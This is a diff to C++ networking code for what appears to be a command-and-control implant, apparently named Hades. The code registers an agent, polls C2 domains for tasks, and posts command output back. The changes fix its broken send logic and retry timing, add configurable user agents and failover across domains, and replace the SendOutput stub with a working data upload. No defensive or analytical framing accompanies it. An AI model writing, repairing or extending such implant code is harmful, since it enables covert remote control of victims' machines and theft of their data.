@@ -48,13 +48,13 @@ Network::Network(ULONG id) {
 
 
 
-BOOL Network::DoPost(PBYTE toSend, SIZE_T len, DomainEntry* domain, ULONG id) {
+BOOL Network::DoPostSingle(PBYTE toSend, SIZE_T len, DomainEntry* domain) {
 	HINTERNET hInternrt = NULL, hConnect = NULL, hRequest = NULL;
 	DWORD flags = INTERNET_FLAG_NO_CACHE_WRITE | INTERNET_FLAG_RELOAD;
 	BOOL ok = FALSE;
 
 	DEBUG_LOG("Sending Request to %s%s\n", domain->domain, conf->PostEndpoint);
-	hInternrt = this->HttpApis->InternetOpenA("TEST", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
+	hInternrt = this->HttpApis->InternetOpenA(conf->UA, INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
 	if (!hInternrt) goto CLEANUP;
 
 	hConnect = this->HttpApis->InternetConnectA(hInternrt, domain->domain, domain->port, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
@@ -69,7 +69,7 @@ BOOL Network::DoPost(PBYTE toSend, SIZE_T len, DomainEntry* domain, ULONG id) {
 	if (!hRequest) goto CLEANUP;
 	this->HttpApis->InternetSetOptionA(hRequest, INTERNET_OPTION_SECURITY_FLAGS, &this->reqFlags, sizeof(this->reqFlags));
 
-	if (this->HttpApis->HttpSendRequestA(hRequest, NULL, 0, (LPVOID)toSend, len)) goto CLEANUP;
+	if (!this->HttpApis->HttpSendRequestA(hRequest, NULL, 0, (LPVOID)toSend, len)) goto CLEANUP;
 	ok = TRUE;
 
 CLEANUP:
@@ -86,7 +86,7 @@ CLEANUP:
 
 
 
-BOOL Network::DoGet(PBYTE* ResponseBuf, SIZE_T size, DomainEntry* domain, ULONG id, UINT *FinalSize, UINT *capacity) {
+BOOL Network::DoGetSingle(PBYTE* ResponseBuf, SIZE_T size, DomainEntry* domain, ULONG id, UINT *FinalSize, UINT *capacity) {
 	HINTERNET hInternet = NULL, hConnect = NULL, hRequest = NULL;
 
 	UINT chunk = 4096;
@@ -102,9 +102,9 @@ BOOL Network::DoGet(PBYTE* ResponseBuf, SIZE_T size, DomainEntry* domain, ULONG 
 	BOOL Res = FALSE;
 
 	char buf[64];
-	snprintf(buf, 64, "X-Agent-ID: %d\r\n", id);
+	snprintf(buf, 64, "X-Agent-ID: %u\r\n", id);
 
-	hInternet = this->HttpApis->InternetOpenA("TEST", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
+	hInternet = this->HttpApis->InternetOpenA(conf->UA, INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
 	if (!hInternet) goto CLEANUP;
 
 	hConnect = this->HttpApis->InternetConnectA(hInternet, domain->domain, domain->port, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
@@ -145,6 +145,7 @@ BOOL Network::DoGet(PBYTE* ResponseBuf, SIZE_T size, DomainEntry* domain, ULONG 
 			Length += BytesRead;
 		}
 	}
+	else { return FALSE; }
 	
 	*FinalSize = Length;
 	*capacity = NewCapacity;
@@ -168,58 +169,74 @@ CLEANUP:
 
 
 
-BOOL Network::RegisterClient(PBYTE Data, SIZE_T DataLength) {
-	BOOL isRegistered = FALSE;
+BOOL Network::DoPost(PBYTE toSend, SIZE_T len) {
+	BOOL ok = FALSE;
 
-	for (int i = 0; i < conf->domaincounts && !isRegistered; i++) {
-		if (conf->domains[i].isDead) {
-			continue;
-		}
+	for (int i = 0; i < conf->domaincounts && !ok; i++) {
+		if (conf->domains[i].isDead) continue;
 
-		UINT retrys = MAX_RETRYS;
-		for (int i = 0; i < retrys; i++) {
-
-			if (this->DoPost(Data, DataLength, &conf->domains[i])); {
-				isRegistered = TRUE;
-			}
-
-			LONGLONG delay = BASE_DELAY_MS * (1 << i);
-			if (delay >= MAX_DELAY_MS) {
-				delay = MAX_DELAY_MS;
-				LONGLONG time = -(LONGLONG)delay * 1000;
-				this->NetSleep(time);
+		for (UINT j = 0; j < MAX_RETRYS; j++) {
+			if (this->DoPostSingle(toSend, len, &conf->domains[i])) {
+				ok = TRUE;
 				break;
 			}
-			
+
+			LONGLONG delay = BASE_DELAY_MS * (1 << j);
+			if (delay > MAX_DELAY_MS) delay = MAX_DELAY_MS;
+			LONGLONG time = -(LONGLONG)delay * 10000;
+			this->NetSleep(time);
 		}
 
-		if (!isRegistered) {
-			if   (conf->domains[i].isSecondChance) { conf->domains[i].isDead = TRUE; }
+		if (!ok) {
+			if (conf->domains[i].isSecondChance) { conf->domains[i].isDead = TRUE; }
 			else { conf->domains[i].isSecondChance = TRUE; }
 		}
-
-
 	}
-	return isRegistered;
-}
-
-
-BOOL Network::GetTask(PBYTE* OutData, SIZE_T BufSize, UINT *FinalSize, UINT *Capacity) {
-	BOOL ok = FALSE;
-	for (INT i = 0; i < conf->domaincounts && !ok; i++) {
-		if (this->DoGet(OutData, BufSize, &conf->domains[i], this->HadesID, FinalSize, Capacity)) {
-			ok = TRUE;
-		}
-
-	}
-
 
 	return ok;
 }
 
 
+BOOL Network::DoGet(PBYTE* ResponseBuf, SIZE_T size, ULONG id, UINT* FinalSize, UINT* capacity) {
+	BOOL ok = FALSE;
+
+	for (int i = 0; i < conf->domaincounts && !ok; i++) {
+		if (conf->domains[i].isDead) continue;
+
+		for (UINT j = 0; j < MAX_RETRYS; j++) {
+			if (this->DoGetSingle(ResponseBuf, size, &conf->domains[i], id, FinalSize, capacity)) {
+				ok = TRUE;
+				break;
+			}
+
+			LONGLONG delay = BASE_DELAY_MS * (1 << j);
+			if (delay > MAX_DELAY_MS) delay = MAX_DELAY_MS;
+			LONGLONG time = -(LONGLONG)delay * 10000;
+			this->NetSleep(time);
+		}
+
+		if (!ok) {
+			if (conf->domains[i].isSecondChance) { conf->domains[i].isDead = TRUE; }
+			else { conf->domains[i].isSecondChance = TRUE; }
+		}
+	}
+
+	return ok;
+}
+
+
+BOOL Network::RegisterClient(PBYTE Data, SIZE_T DataLength) {
+	return this->DoPost(Data, DataLength);
+}
+
+
+BOOL Network::GetTask(PBYTE* OutData, SIZE_T BufSize, UINT* FinalSize, UINT* Capacity) {
+	return this->DoGet(OutData, BufSize, this->HadesID, FinalSize, Capacity);
+}
+
+
 BOOL Network::SendOutput(PBYTE InData, SIZE_T InLen) {
-	return TRUE;
+	return this->DoPost(InData, InLen);
 }
 void Network::NetSleep(LONGLONG time) {
 	LARGE_INTEGER delay;
